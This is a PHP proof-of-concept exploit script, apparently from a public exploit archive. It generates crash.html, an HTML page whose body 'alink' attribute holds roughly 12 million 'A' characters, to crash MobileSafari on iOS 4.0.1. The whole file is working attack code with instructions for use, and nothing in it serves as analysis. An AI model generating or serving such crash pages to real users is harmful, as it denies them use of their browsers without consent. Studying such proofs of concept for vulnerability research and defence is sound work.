<?php
#     _             ____  __            __    ___ 
#    (_)____ _   __/ __ \/ /_____  ____/ /  _/_/ |
#   / // __ \ | / / / / / //_/ _ \/ __  /  / / / /
#  / // / / / |/ / /_/ / ,< /  __/ /_/ /  / / / / 
# /_//_/ /_/|___/\____/_/|_|\___/\__,_/  / /_/_/  
#                   Live by the byte     |_/_/  
#
# Members:
#
# Pr0T3cT10n
# -=M.o.B.=-
# TheLeader
# Sro
# Debug
#
# Contact: inv0ked.israel@gmail.com
#
# -----------------------------------
# The following code is a proof of concept for a crash vulnerability that exists in 'Apple iPhone MobileSafari'.
# Point your browser to the created(crash.html) file and see what happen ;)
# The vulnerable tag is:
# * <body alink="A x 12000085">
# -----------------------------------
# Exploit Title: Apple iPhone Safari (body alink) Remote Crash
# Date: 19/12/2010
# Author: Pr0T3cT10n
# Affected Version: IOS 4.0.1
# Tested on Apple iPhone 3, IOS 4.0.1 MobileSafari
# Launch Safari, point your browser to the page and safari will crash.
# ISRAEL, NULLBYTE.ORG.IL
$string = str_repeat('A', 12000085);
$code   = "<html>
    <head>
        <title>Apple iPhone Safari (body alink) Remote Crash</title>
    </head>
    <body alink='{$string}'>
    </body>
</html>";
if(file_put_contents("./crash.html", $code)) {
    echo("Point your safari mobile browser to `crash.html`.\r\n");
} else {
    echo("Cannot create file.\r\n");
}
?>
